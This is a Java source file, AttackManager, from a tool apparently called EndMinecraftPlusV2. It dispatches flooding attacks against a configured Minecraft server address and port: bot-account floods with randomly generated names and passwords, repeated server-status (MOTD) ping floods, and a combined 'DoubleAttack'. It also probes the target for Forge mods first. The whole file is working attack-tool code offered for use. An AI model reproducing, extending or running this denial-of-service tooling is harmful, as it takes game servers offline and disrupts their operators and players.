package cn.serendipityr.EndMinecraftPlusV2.VersionControl;

import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.AttackUtils.Methods.*;
import cn.serendipityr.EndMinecraftPlusV2.EndMinecraftPlusV2;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ForgeProtocol.MCForge;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ForgeProtocol.MCForgeMOTD;
import cn.serendipityr.EndMinecraftPlusV2.Tools.ConfigUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.DataUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.LogUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.OtherUtils;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class AttackManager {
    public static void doAttack() {
        LogUtil.emptyLog();

        switch (ConfigUtil.AttackMethod) {
            case 1:
                // BotAttack
                DataUtil.loadData();
                if (DataUtil.botRegPasswords.size() < ConfigUtil.BotCount) {
                    for (int i = 0; i < (ConfigUtil.BotCount - DataUtil.botRegPasswords.size()); i++) {
                        DataUtil.updateData(ConfigUtil.BotName.replace("$rnd", OtherUtils.getRandomString(3,5)), OtherUtils.getRandomString(8,10));
                    }
                }

                Map<String, String> modList = new HashMap<>();

                if (ProtocolLibs.highVersion) {
                    if (!cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge.isAfterVersion1_13()) {
                        LogUtil.doLog(0, "正在获取服务器上的Forge Mods...", "BotAttack");
                        modList = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForgeMOTD().pingGetModsList(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge.getProtocolVersion());
                        LogUtil.doLog(0, "Mods: " + Arrays.toString(modList.keySet().toArray()), "BotAttack");
                    }

                    cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.Methods.BotAttack botAttack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.Methods.BotAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    botAttack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, modList);
                    botAttack.start();
                } else {
                    if (!MCForge.isAfterVersion1_13()) {
                        LogUtil.doLog(0, "正在获取服务器上的Forge Mods...", "BotAttack");
                        modList = new MCForgeMOTD().pingGetModsList(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, MCForge.getProtocolVersion());
                        LogUtil.doLog(0, "Mods: " + Arrays.toString(modList.keySet().toArray()), "BotAttack");
                    }

                    BotAttack botAttack = new BotAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    botAttack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, modList);
                    botAttack.start();
                }

                break;
            case 2:
                // MotdAttack
                if (ProtocolLibs.highVersion) {
                    cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.Methods.IAttack motdAttack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.Methods.MotdAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    motdAttack.start();
                } else {
                    IAttack motdAttack = new MotdAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    motdAttack.start();
                }

                break;
            case 3:
                // MotdAttackP
                if (ProtocolLibs.highVersion) {
                    cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.Methods.IAttack motdAttackP = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.Methods.MotdAttackP(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    motdAttackP.start();
                } else {
                    IAttack motdAttackP = new MotdAttackP(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    motdAttackP.start();
                }

                break;
            case 4:
                // DoubleAttack
                Map<String, String> doubleModList = new HashMap<>();

                if (ProtocolLibs.highVersion) {
                    if (!cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge.isAfterVersion1_13()) {
                        LogUtil.doLog(0, "正在获取服务器上的Forge Mods...", "DoubleAttack");
                        doubleModList = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForgeMOTD().pingGetModsList(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge.getProtocolVersion());
                        LogUtil.doLog(0, "Mods: " + Arrays.toString(doubleModList.keySet().toArray()), "DoubleAttack");
                    }

                    cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.Methods.DoubleAttack attack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.Methods.DoubleAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    attack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, doubleModList);
                    attack.setUsername(ConfigUtil.DoubleExploitPlayer);
                    attack.start();
                } else {
                    if (!MCForge.isAfterVersion1_13()) {
                        LogUtil.doLog(0, "正在获取服务器上的Forge Mods...", "DoubleAttack");
                        doubleModList = new MCForgeMOTD().pingGetModsList(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, MCForge.getProtocolVersion());
                        LogUtil.doLog(0, "Mods: " + Arrays.toString(doubleModList.keySet().toArray()), "DoubleAttack");
                    }

                    DoubleAttack attack = new DoubleAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    attack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, doubleModList);
                    attack.setUsername(ConfigUtil.DoubleExploitPlayer);
                    attack.start();
                }

                break;
            default:
                LogUtil.doLog(1, "攻击类型错误，停止运行。", null);
                EndMinecraftPlusV2.Exit();
        }
    }

    public static String getRandomUser() {
        return DataUtil.botRegPasswords.get(new Random().nextInt(DataUtil.botRegPasswords.size()));
    }
}
